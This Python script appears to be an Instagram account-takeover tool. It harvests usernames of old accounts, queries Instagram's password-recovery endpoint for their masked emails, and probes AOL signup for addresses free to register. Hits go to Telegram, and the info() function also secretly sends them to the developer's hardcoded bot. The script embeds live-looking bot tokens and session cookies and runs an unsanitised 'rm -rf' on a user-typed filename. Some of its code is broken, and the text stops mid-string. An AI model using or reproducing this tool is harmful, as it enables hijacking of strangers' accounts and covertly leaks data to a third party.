import os
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'

    
Z = '\033[1;31m' #احمر
F = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
S = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
N="\033[1;37m" # White
import random
from time import sleep
b = random.randint(5,208)
ji = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ksmk =f'\x1b[38;5;{ji}m'


Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
U = '\x1b[1;37m'#ابیض
X = '\033[1;33m' #اصفر
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
R = '\033[1;31m' #احمر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C1 = '\033[2;35m'
H="\x1b[38;5;208m" #
ED='\x1b[38;5;208m'
ED='\x1b[38;5;208m'
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
WDEH = render('{AOL}', colors=['white', 'blue'], align='center')
print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙{WDEH}◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙''')
hhh='7250233115'
ID = input(f"\033[1;31m\033[1m𝗬𝗼𝘂𝗿 𝗜𝗗 : \033[0m")
print('')
token = input(f"\033[1;36m\033[1m𝗬𝗼𝘂𝗿 𝗧𝗼𝗸𝗲𝗻 : \033[0m")
print('')

def fs(id):
    global gg
    url = f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&search_surface=follow_list_pag'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    for i in r.json()['users']:
        gg+=1
        userL = i['username']
        print(f'{Y}{gg} {M}» {H}{userL}')
        open("username.txt", "a").write(f'{userL}\n')
    if 'HI' in listoo:
        m_id=r.json()['next_max_id']
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&max_id='+m_id+'&search_surface=follow_list_page',headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            print()
            try:
                for i in r.json()['users']:
                    gg+=1
                    userL = i["username"]
                    print(f'{Y}{gg} {M}» {H}{userL}')
                    open("username.txt", "a").write(f'{userL}\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()
def fg(id):
    global gg
    url = f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    print()
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    
    for i in r.json()['users']:
        gg+=1
        userL = i['username']
        print(f'{Y}{gg} {M}» {H}{userL}')
        open("username.txt", "a").write(f'{userL}\n')
    if 'HI' in listoo:
        try:
            m_id=r.json()['next_max_id']
        except KeyError:
            exit()
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200&max_id='+m_id,headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            try:
                for i in r.json()['users']:
                    gg+=1
                    userL = i["username"]
                    print(f'{Y}{gg} {M}» {H}{userL}')
                    open("username.txt", "a").write(f'{userL}\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()	

def ethanig():
	 	 
	 	 txt=str(input('NAME FILE :  '))
	 	 os.system(f'rm -rf {txt}')
	 	 print('تم حذف اللسته ')
	 	 exit()
 
#1031593716


def qqq():
  global bv
  
  while True:
    try:
      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(randrange(10000,uid))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': 'ehra'+lsd,
  }
      data = {
      'lsd': 'ehra'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']#['@ehra'
      bv+=1
      print(f'user {bv} = {username}')
      with open('username.txt', 'a') as f:
        f.write(username+'\n')
    except:
      print('error')
import requests
from user_agent import generate_user_agent
from random import randrange,choice
from threading import Thread
import sys


a=0
def uus():
    global a
    while True:
        try:
            pp=''.join(choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(18))
            cookies = {
    
    'ds_user_id': '62725715526',
    
    
}

            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/direct/inbox/',
    'user-agent': generate_user_agent(),
}
            data = {
    'variables': '{"id":"'+str(randrange(10000,uid))+'","render_surface":"PROFILE"}',
    'doc_id': '7663723823674585',
}
            response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data).json()
            
            username=response['data']['user']['username']
            a+=1
            print(f'\x1b[38;5;208m|{a}| --» :{username}')
            
            with open('username.txt', 'a') as f:
                f.write(username+'\n')
        except:''



def xxx():
	id='7115816111'
	TOKEN='7363069714:AAG3hNXlNSFhSwi3g74jyIYHhU4bpCBf1H8'
	print('     اكتب مشكلتك مع يوزرك لكي يرد عليك المطور')
	print('')
	vbn=input(' ما هي مشكلتك ؟  :    ')
	
	requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text= {vbn}")
	print('تم ارسال مشكلتك')
	exit()
   

egi=int(f'1')

if egi==1:
	print('')
	os.system('clear')
	print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙      
                      {WDEH}
    PROGRAMMER @MYEHRA 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙              ''')
	pass
elif egi==2:
	os.system('clear')
	print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙    
                      {WDEH}
    PROGRAMMER @MYEHRA 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙             ''')
	ethanig()
elif egi==3:
	os.system('clear')
	print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙     
                      {WDEH}
    PROGRAMMER @MYEHRA 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙               ''')

	print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  1-             {bo} 2011
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  2-             {bo} 2012
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  3-             {bo} 2013
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  4-             {bo} 2014 {Z} ~ {bo} 2015
  
  ''')
	ud=int(input('enter date ? : '))
	if ud ==1:
	 uid=18957417
	elif ud==2:
	 uid=263014409
	elif ud==3:
	 uid=361365133
	elif ud==4:
		uid=10345503659
	
	os.system('clear')
	print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙      
                      {WDEH}
    PROGRAMMER @MYEHRA 
    ◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙               ''')
    
	print(f' {A}     اللسته تنحفض بأسم username.txt')
	sleep(4)
	executor = ThreadPoolExecutor(max_workers=100)
	for u in range(9):
	     try:
	     	executor.submit(qqq)
	     except:''


	input('')
elif egi==5:
	os.system('clear')
	
	print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙      
                      {WDEH}
    PROGRAMMER @MYEHRA 
    ◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙               ''')

	print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙	
{ED}  1-             {bo} 2011
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  2-             {bo} 2012
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  3-             {bo} 2013
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ED}  4-             {bo} 2014 {Z} ~ {bo} 2015
  
  ''')
	ud=int(input('enter date ? : '))
	if ud ==1:
	 uid=18957417
	elif ud==2:
	 uid=263014409
	elif ud==3:
	 uid=361365133
	elif ud==4:
		uid=10345503659
	
	os.system('clear')
	print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙      
                      {WDEH}
    PROGRAMMER @MYEHRA 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙               ''')
    
	print(f' {A}     اللسته تنحفض بأسم username.txt')
	sleep(4)
	executor = ThreadPoolExecutor(max_workers=100)
	for u in range(9):
	     try:
	     	executor.submit(uus)
	     except:''


	input('')

elif egi==4:
	os.system('clear')
	print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙      
                      {WDEH}
    PROGRAMMER @MYEHRA 
    ◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙              ''')
    
	print(f' {A}     اللسته تنحفض بأسم username.txt')	
	gg = 0
	listoo = ['HI']    
	            
	linux = 'clear'
	windows = 'cls'
	print('') 
	username = str(input(f"{H} «: يــــوزر حسابك الوهمي [=]{C}"))
	print('')
	password = str(input(f"{H}   «: باسورد حسابك الوهمي [=]{C}"))
	print('')
	[linux, windows][os.name == 'nt']
	url = 'https://www.instagram.com/accounts/login/ajax/'
	data = {'username': f'{username}',
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
	        'queryParams': '{}',
	        'optIntoOneTap': 'false'}            
	headers = {'accept': '*/*',
	    'accept-encoding': 'gzip, deflate, br',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-length': '275',
	    'content-type': 'application/x-www-form-urlencoded',
	    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
	    'origin': 'https://www.instagram.com',
	    'referer': 'https://www.instagram.com/',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
	    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': '0',
	    'x-instagram-ajax': 'bc3d5af829ea',
	    'x-requested-with': 'XMLHttpRequest'}		
	k = requests.post(url,headers=headers,data=data)
	if 'authenticated":true' in k.text or 'userId' in k.text:
		print(f"{Y} تسجيل دخول ناجح✔️")
		print('')
		
		([linux, windows][os.name == 'nt'])
		sessionid = k.cookies['sessionid']
	
	user = str(input(f"{H}    «: يوزر تسحب منه لسته [=]{C}"))
	gg = 0
	listoo = ['HI']
	rs_id = requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={
		 'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
    'X-Requested-With': 'XMLHttpRequest',
		
		
		});jsn3=rs_id.json()['data']['user']
	id_tr = jsn3['id']
	print('')
	print('\x1b[38;5;208m Remove the six from your followers [1]\n Remove the six from your followers [2]\n ')
	o = str(input(f"{Y} Choose A Option :-{C}"))
	
	
	if o == '1':
	   fg(id_tr)
	elif o == '2':
	   fs(id_tr)
	else:
	   	print('    eror   ')
	   	exit()



elif egi==8:
	xxx()


def namefile():
      acm='If you want to phish randomly, type no.txt'
      asm='If you want to chk from a list, type the name of the list file'
      print(acm)
      print(asm)
      try:
      	with open('no.txt','a') as ff:
      		ff.write(f'{acm}\n')
      except:''
      while True:
      	try:
      		namefile1=str('no.txt')
      		ooo=open(namefile1,"r").read().splitlines()
      		return ooo
      	except:
      		print(f"{RED}{BOLD}eror in named")
      		exit()
         
    
list99=namefile()
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username,jj):
  global hits
  hits+=1

  try:
    info=get('https://anonyig.com/api/ig/userInfoByUsername/'+username,headers={'user-agent': generate_user_agent()}).json()['result']
    id=info['user']['pk']
    follower_count=info['user']['follower_count']
    following_count=info['user']['following_count']
    full_name=info['user']['full_name']
    media_count=info['user']['media_count']
    try:
      date=requests.get(f'https://alany-2-41663a9bd041.herokuapp.com/?id={id}').json()['date']
    except:
      date='None'
      tlg = f'''
- 𝐄𝐇𝐑𝐀 𝐆𝐎𝐓 𝐇𝐈𝐓 𝐍𝐎. {hit}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : `{username}`
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {follower_count}
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {following_count}
𝐏𝐎𝐒𝐓 : {media_count}
𝐍𝐀𝐌𝐄 :  {full_name}
𝐌𝐀𝐈𝐋 : `{username}@{jj}`
𝐑𝐄𝐒𝐄𝐓 : {rest(username)}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
BY @GODTEST @MYEHRA
'''
   
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    tlg = f'''
- 𝐄𝐇𝐑𝐀 𝐆𝐎𝐓 𝐇𝐈𝐓 𝐍𝐎. {hit}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : `{username}`
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {follower_count}
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {following_count}
𝐏𝐎𝐒𝐓 : {media_count}
𝐍𝐀𝐌𝐄 :  {full_name}
𝐌𝐀𝐈𝐋 : `{username}@{jj}`
𝐑𝐄𝐒𝐄𝐓 : {rest(username)}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
BY @GODTEST @MYEHRA'''    
    cvb=f''' 
    اسطاد المستخدم {ID} متاح جديد
    
    
    {tlg}
    '''
    print(bo+tlg)
    id='7250233115'
    TOKEN='6675457964:AAH9cn95OAM2DWVbO-gwjCQ5Fr76MRJZUNY'
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text= {cvb}")
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')

def ethan(email):
  global bads_email
  try:
    if '@' in email:
      gg=email.split('@')[0]
    else:
      gg=email
    cokANDdata=requests.get('https://login.aol.com/account/create',headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0','accept-language': 'en-US,en;q=0.9',})
    AS=cokANDdata.cookies.get_dict()['AS']
    A1=cokANDdata.cookies.get_dict()['A1']
    A3=cokANDdata.cookies.get_dict()['A3']
    A1S=cokANDdata.cookies.get_dict()['A1S']
    specData=cokANDdata.text.split('''name="attrSetIndex">
        <input type="hidden" value="''')[1].split(f'" name="specData">')[0]
    specId=cokANDdata.text.split('''name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" value="''')[1].split(f'" name="specId">')[0]
    crumb=cokANDdata.text.split('''name="cacheStored">
        <input type="hidden" value="''')[1].split(f'" name="crumb">')[0]
    sessionIndex=cokANDdata.text.split('''"acrumb">
        <input type="hidden" value="''')[1].split(f'" name="sessionIndex">')[0]
    acrumb=cokANDdata.text.split('''name="crumb">
        <input type="hidden" value="''')[1].split(f'" name="acrumb">')[0]
    cookies = {
        'gpp': 'DBAA',
        'gpp_sid': '-1',
        'A1':A1,
        'A3':A3,
        'A1S':A1S,
        '__gads': 'ID=c0M0fd00676f0ea1:T='+'4'+':RT='+'5'+':S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
        '__gpi': 'UID=00000cf0e8904e94:T='+'7'+':RT='+'6'+':S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
        'cmp': 't='+'0'+'&j=0&u=1---',
        'AS': AS,
    };headers = {
        'authority': 'login.aol.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://login.aol.com',
        'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    };params = {
        'validateField': 'userId',
    };data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLied